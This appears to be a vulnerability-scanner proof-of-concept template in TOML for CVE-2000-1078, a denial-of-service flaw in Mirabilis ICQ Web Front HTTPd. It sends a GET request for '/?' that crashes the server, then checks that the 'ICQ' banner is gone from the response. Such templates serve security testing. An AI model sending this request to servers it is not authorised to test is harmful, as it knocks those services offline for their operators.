[info]
author = "ave"
description = "ICQ Web Front HTTPd 对包含问号字符的URL请求处理不当，远程攻击者发送含有?的GET请求即可触发服务崩溃，导致拒绝服务"
id = "POC-AVE-2000-0776"
name = "Mirabilis ICQ Web Front HTTPd DoS PoC"
severity = "medium"
tags = [
    "cve-2000-1078",
    "icq",
    "dos",
]
vuln_id = [
    "CVE-2000-1078",
    "AVE-2000-0776",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/?"
protocol = "http"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["ICQ"]
